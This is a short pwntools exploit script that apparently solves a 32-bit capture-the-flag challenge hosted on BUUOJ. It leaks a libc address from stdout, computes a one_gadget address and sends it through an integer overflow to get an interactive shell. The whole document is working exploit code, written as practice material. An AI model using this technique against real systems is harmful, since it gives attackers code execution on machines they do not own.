'''
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)

1. leak libc through bss_start (stdout)  
2. overflow the interger to send one_gadget address
3. execute one_gadget  
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29148" 
filename = "./exploitable"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so'
remote_libc = './ubuntu16-libc-2.23-x86.so'
libc = ELF(local_libc if local else remote_libc)
# context(arch="amd64", os="linux")
context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    stdout_addr = u32(io.recv(4))

    libc.address = stdout_addr - libc.sym['_IO_2_1_stdout_']
    # remote: 0x3a80c 0x3a80e 0x3a812 0x3a819
    # local: 0x3ac6c 0x3ac6e 0x3ac72 0x3ac79
    one_gadget_addr = libc.address + 0x3a80c 

    payload = str(one_gadget_addr - 0x100000000).encode()
    io.sendline(payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
